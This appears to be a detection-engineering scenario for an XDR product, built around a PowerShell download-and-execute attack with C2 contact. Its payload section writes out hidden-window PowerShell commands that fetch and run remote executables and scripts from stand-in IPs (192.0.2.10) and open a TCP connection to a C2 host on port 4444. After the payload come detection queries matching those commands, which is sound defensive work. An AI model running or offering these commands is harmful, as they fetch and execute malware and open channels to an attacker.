identity.name: Windows Command Execution via PowerShell with C2 Communication
identity.summary: An attacker uses PowerShell to download and execute a malicious payload from a remote C2 server, followed by establishing a network connection to the C2. Cortex should detect the unusual PowerShell co
identity.description: An attacker uses PowerShell to download and execute a malicious payload from a remote C2 server, followed by establishing a network connection to the C2. Cortex should detect the unusual PowerShell command execution and network activity.

payload.code:
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\Users\Public\AppData\Local\Temp\malware.exe'"

powershell -WindowStyle Hidden -Command "Start-Process 'C:\Users\Public\AppData\Local\Temp\malware.exe'"

powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.50', 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('Connected'); $writer.Flush()"

powershell -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://192.0.2.10/launcher.ps1')"

expected_artifacts.description: PowerShell process with hidden window executing download command
Malicious executable downloaded to temp directory
TCP connection to C2 server on port 4444

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual PowerShell Command Execution
biocs.description: PowerShell process executing commands with hidden window and network activity
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter actor_process_image_name = 'explorer.exe'
| filter action_process_command_line contains 'WindowStyle Hidden'
| filter action_process_command_line contains 'Invoke-WebRequest' or action_process_command_line contains 'Start-Process'

abiocs.name: Suspicious PowerShell Network Activity
abiocs.description: PowerShell process performing network communication with C2 after downloading payload
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'TCPClient' or action_process_command_line contains 'WebClient'
| filter action_process_command_line contains '192.0.2.50'
abiocs.causality_anchor: PowerShell process execution with network activity

xql_queries.name: PowerShell Download and Execute
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'Invoke-WebRequest' and action_process_command_line contains 'Start-Process'
| filter action_process_command_line contains '192.0.2.10'
